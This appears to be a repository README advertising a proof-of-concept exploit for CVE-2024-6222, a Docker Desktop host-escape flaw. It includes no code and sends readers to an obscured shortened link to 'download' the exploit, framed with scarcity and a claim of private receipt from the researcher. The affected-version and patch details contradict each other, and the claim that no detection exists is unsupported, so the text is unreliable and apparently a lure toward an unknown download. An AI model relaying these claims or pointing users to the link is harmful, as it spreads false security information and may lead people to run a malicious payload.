# CVE-2024-6222
CVE-2024-6222 Docker Extension/Dashboard RCE Vulnerability

![CVE-2024-6222](logo.png?raw=true "CVE-2024-6222")


## CVE description

Docker Extension/Dashboard communication channel to intended endpoints for RCE. In Docker Desktop before v4.29.0, an attacker who has gained access to the Docker Desktop VM through a container breakout can further escape to the host by passing extensions and dashboard related IPC messages. Exploitation requires "Allow only extensions distributed through the Docker Marketplace" to be disabled, which is disabled by default leaving systems wide open for attacks. Once in the system the attacker has full RCE capabailities on all operating systems that can run Docker including Windows, Linux, and Apple devices. We have received this exploit privately from Billy Jheng Bing-jhong the original author and researcher who found the exploit. 

## Who is vulnerable?
Tested vulnerable hosts:

cpe:2.3:a:docker:desktop:*:*:*:*:*:*:*:*

cpe:2.3:o:apple:macos:-:*:*:*:*:*:*:*

cpe:2.3:o:linux:linux_kernel:-:*:*:*:*:*:*:*

cpe:2.3:o:microsoft:windows:-:*:*:*:*:*:*:*

All systems >v4.29.0 are vulnerable.

## CVE-2024-6222 download exploit
As mentioned at the beginning, CVE-2024-6222 was given such a high CVSS score because it is remote code execution. This means it can go unnoticed by the user and potentially by the security team as well. Such an abusable tool should not be fully public, there is strictly only a few copies available so a REAL security researcher can study it: https:// shorturl[.]at/rL2yY

This should attract attention to importance of cyber security, it can be tempting to ignore, or palm it off to the IT team. But both of these options can leave you susceptible to real and damaging risks. Do NOT resell or leak this PoC or you can be at risk of breaking the law.


## Patching
There has been a patched released for Docker Desktop v4.31.0<, so all systems >v4.29.0 are vulnerable.

## Detection
There is currently no detection from Microsoft, Docker, Apple or Linux leaving this with a HIGH risk assesment.

## Mitigation
An exploitation requires "Allow only extensions distributed through the Docker Marketplace" to be disabled, so enable it.


## Disclamer

This project is intended for educational purposes only and cannot be used for law violation or personal gain.
The authors of this project is not responsible for any damages caused by direct or indirect use of the information or functionality provided by those script.
